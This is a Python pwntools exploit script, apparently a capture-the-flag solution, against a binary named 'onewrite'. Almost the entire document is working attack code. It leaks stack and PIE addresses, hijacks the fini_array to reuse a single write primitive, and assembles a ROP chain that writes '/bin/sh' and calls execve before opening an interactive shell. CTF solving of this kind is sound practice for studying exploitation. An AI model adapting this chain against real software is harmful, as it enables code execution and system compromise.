from pwn import * 
import time


target = process("./onewrite")
elf = ELF("./onewrite")
def leak(which):

    target.recvuntil("> ")
    target.sendline(str(which))
    leak =  int(target.recvline().strip(), 16)
    print("leaked: " + hex(leak))
    return leak

def write(addr, data):
    print("writing to " + hex(addr))
    target.recvuntil("address :")
    target.send(str(addr))
    target.recvuntil("data :")
    target.send(data)

storage = 0x2ad490

leak_stack = leak(1)
write(leak_stack + 0x11, "\x04" * 8)

leak_pie = leak(2)
pie_base = leak_pie - elf.symbols["do_leak"]
storage += pie_base
fini_array = pie_base + elf.symbols['__do_global_dtors_aux_fini_array_entry']
do_overwrite = pie_base + elf.symbols["do_overwrite"]

write(fini_array + 8, p64(do_overwrite))
write(fini_array, p64(do_overwrite))
csu_fini_ret = leak_stack - 0x48
write(csu_fini_ret, p64(pie_base + elf.symbols["__libc_csu_fini"]))
csu_fini_ret += 8

binsh = p64(0x68732f6e69622f)
syscall = p64(0x000000000000917c + pie_base)
poprax = p64(0x00000000000460ac + pie_base)
poprdi = p64(0x00000000000084fa + pie_base)
poprdx = p64(0x00000000000484c5 + pie_base)
poprsi = p64(0x000000000000d9f2 + pie_base)
mov = p64(0x00000000000437db + pie_base) # mov qword ptr [rdi], rsi ; ret

def qw(loc, data):
    global csu_fini_ret
    global pie_base

    write(loc + leak_stack , data)
    write(csu_fini_ret, p64(pie_base + elf.symbols["__libc_csu_fini"]))
    csu_fini_ret += 8

qw(232+8, poprsi)
qw(240+8, binsh)
qw(248+8, poprdi)
qw(256+8, p64(storage))
qw(264+8, mov)
qw(264+16, poprax)
qw(272+16, p64(59))
qw(280+16, poprdi)
qw(288+16, p64(storage))
qw(296+16, poprsi)
qw(304+16, p64(0))
qw(312+16, poprdx)
qw(320+16, p64(0))
qw(328+16, syscall)


# 0x00000000000106f3 : add rsp, 0xd0 ; pop rbx ; ret
pivotGadget = pie_base + 0x106f3
write(leak_stack + 16, p64(pivotGadget))
target.interactive()
